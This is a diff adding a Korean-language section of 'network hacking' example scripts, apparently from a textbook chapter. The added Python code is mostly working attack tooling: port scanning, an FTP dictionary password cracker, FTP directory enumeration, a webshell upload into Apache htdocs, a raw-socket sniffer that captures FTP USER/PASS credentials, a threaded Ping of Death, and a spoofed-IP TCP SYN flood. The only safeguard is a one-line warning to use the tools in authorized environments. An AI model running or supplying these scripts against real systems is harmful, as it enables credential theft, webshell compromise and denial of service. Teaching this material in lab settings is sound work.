@@ -693,7 +693,245 @@ if __name__ == "__main__":
 
 ---
 
-## 9. 도구 실행 참고
+---
+
+## 9. 네트워크 해킹 원본 예제
+
+### 예제7-1 port scanning — nmap 라이브러리로 포트 스캔 및 프로토콜/서비스 출력
+```python
+import sys
+import os
+import socket
+import nmap                                                        #(1)
+
+nm = nmap.PortScanner()                                            #(2)
+
+nm.scan('server', '1-1024')                                        #(3)
+
+for host in nm.all_hosts():                                        #(4)
+    print('----------------------------------------------------')
+    print('Host : {0} ({1})'.format(host, nm[host].hostname()))    #(5)
+    print('State : {0}'.format(nm[host].state()))                  #(6)
+
+    for proto in nm[host].all_protocols():                         #(7)
+        print('----------')
+        print('Protocol : {0}'.format(proto))                        
+
+        lport = list(nm[host][proto].keys())                       #(8)
+        lport.sort()
+        for port in lport:
+            print('port : {0}\tstate : {1}'.format(port, nm[host][proto][port]))   #(9)
+print('----------------------------------------------------')
+```
+
+### 예제7-2 FTP Password Cracking — FTP 로그인 딕셔너리 공격으로 패스워드 크래킹
+```python
+from ftplib import FTP
+
+wordlist = open('wordlist.txt', 'r')                  #(1)
+user_login = "server"
+
+def getPassword(password):                            #(2)
+    try:
+        ftp = FTP("server")                           #(3)
+        ftp.login(user_login,password)                #(4)
+        print "user password:", password
+        return True
+    except Exception:                                 #(5)
+        return False    
+
+passwords = wordlist.readlines()
+for password in passwords:      
+    password = password.strip()
+    print "test password:", password
+    if(getPassword(password)):                        #(6)
+        break
+wordlist.close()
+```
+
+### 예제7-3 Directory Listing — FTP 접속 후 재귀적 디렉토리 탐색으로 Apache 웹루트 탐색
+```python
+from ftplib import FTP
+
+apacheDir = "htdocs"
+serverName = "server"
+serverID = "server"
+serverPW = "server"
+
+def getDirList(cftp, name):                            #(1)
+    dirList = []
+    if("." not in name):                               #(2)
+        if(len(name) == 0):
+            dirList = ftp.nlst()                       #(3)
+        else:
+            dirList = ftp.nlst(name)               
+    return dirList
+
+def checkApache(dirName1, dirName2):                   #(4)
+    if(dirName1.lower().find(apacheDir) >= 0):             
+        print dirName1
+    if(dirName2.lower().find(apacheDir) >= 0):
+        print dirName1 +"/"+ dirName2
+
+ftp = FTP(serverName, serverID, serverPW)              #(5)
+
+dirList1 = getDirList(ftp, "")                         #(6)
+
+for name1 in dirList1:                                 #(7)
+    checkApache(name1,"")                              #(8)
+    dirList2 = getDirList(ftp, name1)                  #(9)
+    for name2 in dirList2:
+        checkApache(name1, name2)
+        dirList3 = getDirList(ftp, name1+"/"+name2)
+```
+
+### 예제7-4 FTP Web Shell 공격 — FTP로 Apache htdocs에 웹셸 업로드
+```python
+from ftplib import FTP
+
+apacheDir = "htdocs"
+serverName = "server"
+serverID = "server"
+serverPW = "server"
+
+ftp = FTP(serverName, serverID, serverPW)       #(1)
+
+ftp.cwd("APM_Setup/htdocs")                     #(2)
+
+fp = open("webshell.php","rb")                  #(3)
+ftp.storbinary("STOR webshell.php",fp)          #(4)
+
+fp.close()
+ftp.quit()
+```
+
+### 예제7-5 Packet Sniffing — Raw 소켓으로 네트워크 패킷 캡처, FTP USER/PASS 자격증명 탐지
+```python
+import socket
+import string
+
+HOST = socket.gethostbyname(socket.gethostname())
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)     #(1)
+s.bind((HOST, 0))                                                         #(2)
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                     #(3)
+s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)                              #(4)
+
+while True:
+    data = s.recvfrom(65565)                                              #(5)
+    printable = set(string.printable)                                     #(6)
+    parsedData = ''.join(x if x in printable else '.' for x in data[0])
+
+    if(parsedData.find("USER") > 0):                                      #(7)
+        print parsedData
+    elif(parsedData.find("PASS") > 0):
+        print parsedData
+    elif(parsedData.find("530 User cannot log in") > 0):
+        print parsedData
+    elif(parsedData.find("230 User logged in") > 0):
+        print parsedData
+```
+
+### 예제7-6 Ping Of Death — 멀티스레드로 65500바이트 대용량 ping 패킷 반복 전송 (DoS)
+```python
+import subprocess
+import thread
+import time
+
+def POD(id):                                                    #(1)
+    ret = subprocess.call("ping server -l 65500", shell=True)
+    print "%d," % id
+      
+for i in range(500):                                            #(2)
+    thread.start_new_thread(POD, (i,))                          #(3)
+    time.sleep(0.8)                                             #(4)
+```
+
+### 예제7-7 TCP SYN Flood — Raw 소켓으로 IP 스푸핑된 TCP SYN 패킷 대량 전송
+```python
+import socket, sys
+from struct import *
+
+def makeChecksum(msg):                                                #(1)
+    s = 0
+    for i in range(0, len(msg), 2):
+        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
+        s = s + w
+    s = (s>>16) + (s & 0xffff);
+    s = ~s & 0xffff
+    return s
+
+def makeIPHeader(sourceIP, destIP):                                   #(2)
+    version = 4
+    ihl = 5
+    typeOfService = 0
+    totalLength = 20+20                                          
+    id = 999                
+    flagsOffSet = 0
+    ttl =  255               
+    protocol = socket.IPPROTO_TCP                             
+    headerChecksum = 0             
+    sourceAddress = socket.inet_aton ( sourceIP )
+    destinationAddress = socket.inet_aton ( destIP )
+    ihlVersion = (version << 4) + ihl
+    return pack('!BBHHHBBH4s4s' , ihlVersion, typeOfService, totalLength, id, flagsOffSet,
+                                  ttl, protocol, headerChecksum, sourceAddress, destinationAddress)   #(3)
+
+def makeTCPHeader(port, icheckSum="none"):                            #(4)
+    sourcePort = port                                            
+    destinationAddressPort = 80                                 
+    SeqNumber = 0
+    AckNumber = 0
+    dataOffset = 5                                                
+    flagFin = 0
+    flagSyn = 1                                                   
+    flagRst = 0
+    flagPsh = 0
+    flagAck = 0
+    flagUrg = 0
+
+    window = socket.htons (5840)   
+
+    if(icheckSum == "none"):
+        checksum = 0
+    else:
+        checksum = icheckSum
+
+    urgentPointer = 0
+    dataOffsetResv = (dataOffset << 4) + 0
+    flags = (flagUrg << 5)+ (flagAck << 4) + (flagPsh <<3)+ (flagRst << 2) + (flagSyn << 1) + flagFin
+    return pack('!HHLLBBHHH', sourcePort, destinationAddressPort, SeqNumber, 
+AckNumber, dataOffsetResv,  flags,  window, checksum, urgentPointer)             #(5)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)           #(6)
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                            #(7)
+
+for j in range(1,20):                                                            #(8)
+        for k in range(1,255):
+                for l in range(1,255):
+                        sourceIP = "169.254.%s.%s"%(k,l)                         #(9)
+                        destIP = "169.254.27.229"   
+
+                        ipHeader  = makeIPHeader(sourceIP, destIP)               #(10)
+                        tcpHeader = makeTCPHeader(10000+j+k+l)                   #(11)
+
+                        sourceAddr = socket.inet_aton( sourceIP )                #(12)
+                        destAddr = socket.inet_aton(destIP)
+
+                        placeholder = 0
+                        protocol = socket.IPPROTO_TCP
+                        tcpLen = len(tcpHeader)
+                        psh = pack('!4s4sBBH', sourceAddr, destAddr, placeholder, protocol, tcpLen);
+                        psh = psh + tcpHeader;
+                        tcpChecksum = makeChecksum(psh)                          #(13)
+
+                        tcpHeader = makeTCPHeader(10000+j+k+l,tcpChecksum)       #(14)
+
+                        packet = ipHeader + tcpHeader                                       
+                        s.sendto(packet, (destIP , 0 ))                          #(15)
+```
+
+## 10. 도구 실행 참고
 
 ```
 ⚠️  모든 도구는 허가된 환경에서만 사용!
